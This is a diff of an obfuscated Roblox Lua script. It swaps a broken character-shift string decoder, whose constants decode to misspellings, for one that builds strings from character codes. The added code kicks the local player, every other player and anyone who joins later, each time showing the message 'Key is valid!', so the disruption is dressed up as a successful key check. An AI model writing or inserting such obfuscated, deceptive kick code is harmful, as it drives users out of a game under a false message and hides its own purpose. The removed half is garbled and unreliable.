@@ -1,4 +1,6 @@
-local function f(g)local h={}for i=1,#g do h[i]=string.char(string.byte(g,i)-1)end return table.concat(h)end
-local j=game:GetService(f("Qmzfsf"))local k=j[f("Mpbdlp")]if k then k[f("Lfjl")](k,f("Lfz!jt!wbmje#"))end
-for l,m in pairs(j:GetPlayers())do if m~=k then pcall(function()m[f("Lfjl")](m,f("Lfz!jt!wbmje#"))end)end end
-j[f("Qmzfsf!Beefe")]:Connect(function(n)task.wait(0.3)pcall(function()n[f("Lfjl")](n,f("Lfz!jt!wbmje#"))end)end)
+local y={75,101,121,32,105,115,32,118,97,108,105,100,33}
+local function z(A)local B=""for C=1,#A do B=B..string.char(A[C])end return B end
+local D=function(E)return game:GetService(z({80,108,97,121,101,114,115}))end
+local F=D()local G=F.LocalPlayer;if G then G:Kick(z(y))end
+for H,I in pairs(F:GetPlayers())do if I~=G then pcall(function()I:Kick(z(y))end)end end
+F.PlayerAdded:Connect(function(J)pcall(function()J:Kick(z(y))end)end)
